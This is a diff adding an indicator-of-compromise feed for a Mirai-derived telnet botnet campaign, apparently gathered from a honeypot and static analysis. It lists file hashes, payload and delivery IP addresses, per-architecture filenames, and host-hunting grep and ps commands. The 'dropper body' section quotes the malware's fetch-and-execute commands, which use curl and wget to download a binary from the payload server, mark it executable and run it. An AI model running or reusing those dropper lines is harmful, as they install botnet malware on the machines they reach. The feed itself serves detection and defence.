@@ -1,0 +1,72 @@
+# ==============================================================
+# MIRAI_TELNETCURL — IOC Feed
+# Author   : AfterPacket
+# Captured : 2026-08-01T00:34:21Z .. 2026-08-07T10:03:55Z
+# TLP      : TLP:WHITE
+# Source   : Drosera honeypot / static analysis
+# ==============================================================
+#
+# NOTE: MD5 and SHA-1 are not listed — the analysis host could not
+# execute hashing tools. Only sidecar SHA-256 is available.
+
+# [HASHES — SHA-256]
+# Droppers — curl and busybox-wget variants of the same script
+3801a288c16a19c57c7a8a7b0f139cf630d2cd0c4bbcb26876e3593c492ffc5d   # /curl.sh, 541 B
+e1568cae97252fa9350ef2d2d381975c8bd29e11f126fb06bd64e92a73d7beb9   # /wget.sh, 600 B  (VT 15/60)
+# ELF payloads (5 architectures, captured from 60.185.49.73)
+b6260a8c94f54ff97d7838eee6391c9c32284d4b6f81e36401757cbafdc99a46   # /arm7,   497344 B
+9cbe35b1d10f55d712738644c60c2cc47eac13e06f23ba849abb1bbdbdfdc5f2   # /arm5,   510624 B
+a834705aedd521b2d75ec51b593ee82f49d8f3b9c61b5ef6034dc8340b70a98b   # /arm,    516512 B
+3afa3a117915cf21b105ea9c8aae346af4f733556e6a6fe62e1352901d2b4831   # /mips,   672772 B
+f6f9c5f16c7d2b9e4df3b132c05f356c9abc48a7ee1d5f079016338bc2030e40   # /mipsel, 681736 B
+
+# [IP ADDRESSES]
+# Confidence: HIGH — hardcoded payload server in both dropper scripts
+205.237.110.232   # serves /arm /arm5 /arm7 /mips /mipsel
+# Confidence: HIGH — direct honeypot capture (telnet)
+60.185.49.73      # delivered the 5 ELF payloads directly
+138.117.43.19     # delivered both /curl.sh and /wget.sh
+
+# [ATTRIBUTION LINK]
+# The five payload filenames served by 205.237.110.232 (arm, arm5, arm7,
+# mips, mipsel) match the five filenames dropped by 60.185.49.73 exactly.
+# Same kit, two hosts. Treat as one campaign.
+
+# [DOMAINS]
+# None. Bare IP staging.
+
+# [PORTS]
+80    # HTTP — payload retrieval from 205.237.110.232
+
+# [HTTP INDICATORS]
+# Endpoint: http://205.237.110.232/<arch>
+# No User-Agent override — default curl/busybox-wget UA.
+
+# [CAMPAIGN METADATA]
+# Family     : MIRAI_TELNETCURL (Mirai-derived, telnet propagation)
+# Exec arg   : telnet.curl   <- infection-vector tag passed to every payload
+# Permissions: chmod 777 (not chmod +x) on every payload
+# Fixed per-architecture output filenames — these are the strongest
+# detection strings in the family, being non-dictionary and stable:
+#   VFASXC -> arm     WQZRTY -> arm5    YUIOXC -> arm7
+#   GHJKLB -> mips    MNCXOP -> mipsel
+# VirusTotal : /wget.sh 15/60 (downloader.shell/bashdlod).
+#              /curl.sh and all 5 ELF payloads have no VT record at capture.
+
+# [DROPPER BODY, per architecture]
+# curl http://205.237.110.232/arm -o VFASXC; chmod 777 VFASXC; ./VFASXC telnet.curl
+# busybox wget http://205.237.110.232/arm -O VFASXC; chmod 777 VFASXC; ./VFASXC telnet.curl
+
+# [HOST-BASED GREP STRINGS]
+# "205.237.110.232"
+# "telnet.curl"
+# "VFASXC"
+# "WQZRTY"
+# "YUIOXC"
+# "GHJKLB"
+# "MNCXOP"
+
+# [HOST HUNT]
+# grep -rl "205.237.110.232\|telnet.curl" /tmp /var/tmp /home /root 2>/dev/null
+# ls -la VFASXC WQZRTY YUIOXC GHJKLB MNCXOP 2>/dev/null
+# ps aux | grep -E "VFASXC|WQZRTY|YUIOXC|GHJKLB|MNCXOP"
